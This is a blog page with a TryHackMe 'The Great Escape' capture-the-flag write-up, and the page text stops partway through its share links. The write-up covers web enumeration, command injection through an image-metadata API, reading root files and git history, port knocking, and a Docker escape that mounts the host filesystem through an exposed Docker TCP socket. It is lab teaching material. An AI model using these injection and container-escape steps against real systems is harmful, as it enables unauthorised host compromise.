@@ -1,0 +1,317 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="The Great Escape Writeup TryHackMe" /><meta name="author" content="v3r4x" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://0xv3r4x.github.io/posts/the-great-escape-writeup-tryhackme/" /><meta property="og:url" content="https://0xv3r4x.github.io/posts/the-great-escape-writeup-tryhackme/" /><meta property="og:site_name" content="v3r4x" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-29T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="The Great Escape Writeup TryHackMe" /><meta name="twitter:site" content="@0xv3r4x" /><meta name="twitter:creator" content="@v3r4x" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"v3r4x"},"dateModified":"2022-06-26T22:17:03+01:00","datePublished":"2022-01-29T00:00:00+00:00","description":"Overview","headline":"The Great Escape Writeup TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xv3r4x.github.io/posts/the-great-escape-writeup-tryhackme/"},"url":"https://0xv3r4x.github.io/posts/the-great-escape-writeup-tryhackme/"}</script><title>The Great Escape Writeup | TryHackMe | v3r4x</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="v3r4x"><meta name="application-name" content="v3r4x"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/common/avatar-small.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">v3r4x</a></div><div class="site-subtitle font-italic">semper vigilat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/0xV3R4X" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xv3r4x" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>The Great Escape Writeup | TryHackMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>The Great Escape Writeup | TryHackMe</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1643414400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 29, 2022 </em> </span> <span> Updated <em class="" data-ts="1656278223" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 26, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> v3r4x </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2035 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h3 id="overview"><span class="mr-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This is my writeup for the “The Great Escape” CTF. This challenge was a lot of fun, but very difficult (as you will see). I would recommend this if you have completed other docker-related CTFs - you will definitely find this a lot easier than I did.</p><h3 id="how-to-access"><span class="mr-2">How to Access</span><a href="#how-to-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I completed this through TryHackMe. I’m not aware of this being hosted anywhere else but if it is then I will amend this guide.</p><p>Link to the room</p><ul><li>https://tryhackme.com/room/thegreatescape</ul><h2 id="steps"><span class="mr-2">Steps</span><a href="#steps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There are obviously multiple ways to do this challenge and I would strongly recommend that you look at other published writeups to learn the different ways you can tackle this, especially the final part.</p><h3 id="a-simple-web-app"><span class="mr-2">A Simple Web App</span><a href="#a-simple-web-app" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><em>Start off with a simple webapp. Can you find the hidden flag?</em></p><p><strong>HINT</strong>: A well-known file may offer some help.</p><p>The first thing I did was to see what was happening on the machine. I used <code class="language-plaintext highlighter-rouge">nmap</code> for this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Wed Feb 17 20:15:27 2021 as: nmap -sC -sV -oN initial_scan 10.10.148.224
+Nmap scan report for 10.10.148.224
+Host is up (0.048s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh?
+| fingerprint-strings:
+|   GenericLines:
+|_    +9%SWIE/at-*u5d[k,%Z
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  http    nginx 1.19.6
+| http-robots.txt: 3 disallowed entries
+|_/api/ /exif-util /*.bak.txt$
+|_http-server-header: nginx/1.19.6
+|_http-title: docker-escape-nuxt
+|_http-trane-info: Problem with XML parsing of /evox/about
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port22-TCP:V=7.91%I=7%D=2/17%Time=602D796D%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,16,"\+9%SWIE/at-\*u5d\[k,%Z\r\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Feb 17 20:18:41 2021 -- 1 IP address (1 host up) scanned in 193.73 seconds
+</pre></table></code></div></div><p>From the above, it shows that the machine is open on ports 22 (ssh) and 80 (web page). So, I go check out the website. While I did this, I was running GoBuster in the background to check for any funky directories on the primary site, but everything it tried returned a <code class="language-plaintext highlighter-rouge">200</code> status code.</p><p><img data-src="/assets/posts/20220129/website_home.png" alt="website home page" data-proofer-ignore></p><p>There wasn’t a whole lot to this site (on the face of it at least); just a homepage, a login/sign-up page. Looking at the hint, I realised that the site may have a “robots.txt” file, and, sure enough, it did!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>User-agent: *
+Allow: /
+Disallow: /api/
+</pre></table></code></div></div><p>I then decided to run GoBuster on the <code class="language-plaintext highlighter-rouge">/api</code> portion of the site, but to no avail. The <em>robots.txt</em> file does indicate another page: <code class="language-plaintext highlighter-rouge">/exif-util</code>, so I decided to have a look:</p><p><img data-src="/assets/posts/20220129/exif_util.png" alt="exif-util page" data-proofer-ignore></p><p>This appeared to be a file upload for images. After trying a bunch of file uploads with various formats, I decided to give up on this portion and do some more research.</p><p>I decided to look into other well-known practices for building websites and stumbled across an article which detailed a standard in which devs place a <em>security.txt</em> file within the .well-known directory. I now realised what the clue was hinting at.</p><p>Navigating to this file gave me this text:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Hey you found me!
+</pre></table></code></div></div><p>The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.</p><p>See https://securitytxt.org/ for more information.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Ping /api/fl46 with a HEAD request for a nifty treat.
+</pre></table></code></div></div><p>Nice! I decided to breakout <code class="language-plaintext highlighter-rouge">curl</code> for this next part:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>$ curl -I http://10.10.148.224/api/fl46
+HTTP/1.1 200 OK
+Server: nginx/1.19.6
+Date: Wed, 17 Feb 2021 20:32:40 GMT
+Connection: keep-alive
+flag: THM{b80**************************ad4}
+</pre></table></code></div></div><p>And that was flag 1.</p><h3 id="root-root"><span class="mr-2">Root! Root?</span><a href="#root-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><em>There’s a flag hidden by root on one of the machines. Can you find it?</em></p><p><strong>HINT</strong>: Silly devs leaving their backups lying around…</p><p>After some extensive head scratching, I decided the best option was to try and play about with the API using this <code class="language-plaintext highlighter-rouge">/exif-util</code> page. When I uploaded an image using a URL, it returned something like this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+</pre><td class="rouge-code"><pre>EXIF:
+----------------------
+[PNG-IHDR] Image Width - 600
+[PNG-IHDR] Image Height - 300
+[PNG-IHDR] Bits Per Sample - 8
+[PNG-IHDR] Color Type - True Color with Alpha
+[PNG-IHDR] Compression Type - Deflate
+[PNG-IHDR] Filter Method - Adaptive
+[PNG-IHDR] Interlace Method - No Interlace
+[PNG-sRGB] sRGB Rendering Intent - Perceptual
+[PNG-gAMA] Image Gamma - 0.455
+[PNG-pHYs] Pixels Per Unit X - 3778
+[PNG-pHYs] Pixels Per Unit Y - 3778
+[PNG-pHYs] Unit Specifier - Metres
+[File Type] Detected File Type Name - PNG
+[File Type] Detected File Type Long Name - Portable Network Graphics
+[File Type] Detected MIME Type - image/png
+[File Type] Expected File Name Extension - png
+
+XMP:
+----------------------&lt;/code&gt;&lt;/pre&gt;
+
+Going into the console, on the network tab, I saw that there was a call being made to the API.  I then confirmed this using curl and, sure enough, I got the same output:
+
+&lt;pre&gt;&lt;code&gt;$ curl http://10.10.148.224/api/exif?url=http:%2F%2F10.10.148.224%2F_nuxt%2Fimg%2Flogo-light.49baa3d.png
+EXIF:
+----------------------
+[PNG-IHDR] Image Width - 600
+[PNG-IHDR] Image Height - 300
+[PNG-IHDR] Bits Per Sample - 8
+[PNG-IHDR] Color Type - True Color with Alpha
+[PNG-IHDR] Compression Type - Deflate
+[PNG-IHDR] Filter Method - Adaptive
+[PNG-IHDR] Interlace Method - No Interlace
+[PNG-sRGB] sRGB Rendering Intent - Perceptual
+[PNG-gAMA] Image Gamma - 0.455
+[PNG-pHYs] Pixels Per Unit X - 3778
+[PNG-pHYs] Pixels Per Unit Y - 3778
+[PNG-pHYs] Unit Specifier - Metres
+[File Type] Detected File Type Name - PNG
+[File Type] Detected File Type Long Name - Portable Network Graphics
+[File Type] Detected MIME Type - image/png
+[File Type] Expected File Name Extension - png
+
+XMP:
+----------------------
+</pre></table></code></div></div><p>I then began to run a bunch of other stuff to confirm that they are interpreted by the URL. I didn’t appear that the system had python, netcat, or anything else installed - except curl and git.</p><p>I then remembered that this section is talking about backups. Going back to notes I made earlier, I realised that <em>.bak.txt</em> was specified in the <em>robots.txt</em> file. These <em>.bak</em> files are mostly created by a program that needs to store backups. Although, I had a feeling that this may have potentially been created left accidentally by one of the developers.</p><p>I tried looking for various backup files for each of the pages on the site and eventually stumbled across the <em>.bak</em> file for exif-util:</p><p><img data-src="/assets/posts/20220129/backup_file.png" alt="backup file" data-proofer-ignore></p><p>I continued to try some more combos with the urls I found earlier but I didn’t get anywhere.</p><p>I created a short Python script so I could execute this from the terminal (just to make my life easier, I was almost at my wits end at this point).</p><p>I <strong>eventually</strong> discovered…</p><p>(insert injecting stuff)</p><p>So now I know that I am <em>root</em> on this machine. There is also a suspicious <em>dev-note.txt</em> file in the <code class="language-plaintext highlighter-rouge">/root</code> directory. A simple <code class="language-plaintext highlighter-rouge">cat</code> gave this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>$ python3 url_inject.py "10.10.148.224" "cat /root/dev-note.txt"
+Hey guys,
+
+Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.
+
+Anyways, the password is fluffybunnies123
+
+Cheers,
+
+Hydra
+</pre></table></code></div></div><p>Finally, a username (<em>hydra</em>) and password (<em>fluffybunnies123</em>). I attempted to SSH into the machine as <em>root</em> and as <em>hydra</em>, however, SSH was acting very strange - another rabbit hole.</p><p>Looking at the root directory again, I noticed a <code class="language-plaintext highlighter-rouge">.git</code> directory. Expanding the log gives:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>$ python3 url_inject.py "10.10.148.224" "cd /root; git log"     
+commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
+Author: Hydra &lt;hydragyrum@example.com&gt;
+Date:   Thu Jan 7 16:48:58 2021 +0000
+
+    fixed the dev note
+
+commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
+Author: Hydra &lt;hydragyrum@example.com&gt;
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Removed the flag and original dev note b/c Security
+
+commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
+Author: Hydra &lt;hydragyrum@example.com&gt;
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Added the flag and dev notes
+</pre></table></code></div></div><p>It seems that <em>hydra</em> has put a flag in the bottom commit…</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>$ python3 url_inject.py "10.10.148.224" "cd /root; git checkout a3d30a7d0510dc6565ff9316e3fb84434916dee8; ls -la"
+               HEAD is now at a3d30a7 Added the flag and dev notes
+total 40
+drwx------ 1 root root 4096 Feb 17 21:18 .
+drwxr-xr-x 1 root root 4096 Jan  7 22:14 ..
+lrwxrwxrwx 1 root root    9 Jan  6 20:51 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x 1 root root 4096 Feb 17 21:19 .git
+-rw-r--r-- 1 root root   53 Jan  6 20:51 .gitconfig
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-rw-r--r-- 1 root root  213 Feb 17 21:18 dev-note.txt
+-rw-r--r-- 1 root root   75 Feb 17 21:18 flag.txt
+</pre></table></code></div></div><p>The above shows that there are two text files; a flag (thank god) and a previous version of <em>dev-note</em>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>$ python3 url_inject.py "10.10.148.224" "cd /root; cat dev-note.txt"
+Hey guys,
+
+I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+
+Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+
+Cheers,
+
+Hydra
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>$ python3 url_inject.py "10.10.148.224" "cd /root; cat flag.txt"
+               You found the root flag, or did you?
+
+THM{0cb**************************876}`
+</pre></table></code></div></div><h3 id="the-great-escape"><span class="mr-2">The Great Escape</span><a href="#the-great-escape" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><em>You thought you had root. But the root on a docker container isn’t all that helpful. Find the secret flag.</em></p><p>Unfortunately, there is no hint for this one. Great. Looking back at the output from <em>dev-note.txt</em>, in the previous section, it looks like we can use port knocking on ports 42, 1337, 10420, 6969, and 63000 to check for a docker tcp port.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ curl 10.10.148.224:&lt;port&gt; -m 1
+</pre></table></code></div></div><p>I checked this worked with <code class="language-plaintext highlighter-rouge">nmap</code>, but no port opened. I then used the same port knocking technique with <code class="language-plaintext highlighter-rouge">netcat</code> and it opened port 2375.</p><p>I had never used docker before so I did some research into the different commands I could use. I found I could list files similarly to a normal terminal.</p><p>I didn’t really know how to proceed at this point, so I decided to take a break and come back to it the next day. I watched some other docker-related CTF tutorials and found that you can mount an image file using <code class="language-plaintext highlighter-rouge">docker run</code>. I first had a look to see if there were any image files available.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>$ DOCKER_HOST=tcp://10.10.148.224:2375 docker image ls
+REPOSITORY                                    TAG       IMAGE ID       CREATED        SIZE
+exif-api-dev                                  latest    4084cb55e1c7   4 hours ago    214MB
+exif-api                                      latest    923c5821b907   5 hours ago    163MB
+frontend                                      latest    577f9da1362e   5 hours ago    138MB
+endlessh                                      latest    7bde5182dc5e   24 hours ago   5.67MB
+nginx                                         latest    ae2feff98a0c   3 weeks ago    133MB
+debian                                        10-slim   4a9cd57610d6   3 weeks ago    69.2MB
+registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   4 weeks ago    103MB
+alpine                                        3.9       78a2ce922f86   8 months ago   5.55MB
+</pre></table></code></div></div><p>Then using alpine, I mounted the image onto the <code class="language-plaintext highlighter-rouge">mnt/host</code> directory within the docker container. I then grabbed an interactive session with <code class="language-plaintext highlighter-rouge">sh</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ DOCKER_HOST=tcp://$TARGET_IP:2375 docker run -it -v /:/mnt/host alpine:3.9 /bin/sh
+</pre></table></code></div></div><p>I navigated to this directory and had a look around. I found there was a <code class="language-plaintext highlighter-rouge">root</code> directory which contained the final flag…</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>$ ls -la /root
+total 24
+drwx------    3 root     root          4096 Jan  6 22:37 .
+drwxr-xr-x   22 root     root          4096 Jan  6 16:44 ..
+lrwxrwxrwx    1 root     root             9 Jan  6 17:22 .bash_history -&gt; /dev/null
+-rw-r-----    1 root     root          3106 Apr  9  2018 .bashrc
+drwxr-xr-x    3 root     root          4096 Jan  6 22:35 .local
+-rw-r-----    1 root     root           148 Aug 17  2015 .profile
+-rw-------    1 root     root            74 Jan  6 22:37 flag.txt
+$ cat /root/flag.txt
+Congrats, you found the real flag!
+
+THM{c62**************************724}
+</pre></table></code></div></div><p>And that’s it!</p><h3 id="summary-and-feedback"><span class="mr-2">Summary and Feedback</span><a href="#summary-and-feedback" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This was a very hard challenge. It took me a total of around 6 hours to complete this (including research) as I had never used docker in a CTF before. The first two flags were fairly easy to get (thank you Python)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >ssrf</a> <a href="/tags/injection/" class="post-tag no-text-decoration" >injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=The+Great+Escape+Writeup+%7C+TryHackMe+-+v3r4x&url=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fthe-great-escape-writeup-tryhackme%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=The+Great+Escape+Writeup+%7C+TryHackMe+-+v3r4x&u=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fthe-great-escape-writeup-tryhackme%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fthe-great-escape-writeup-tryhackme%2F&text=The+Great+Escape+Writeup+%7C+TryHackMe+-+v3r4x" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" 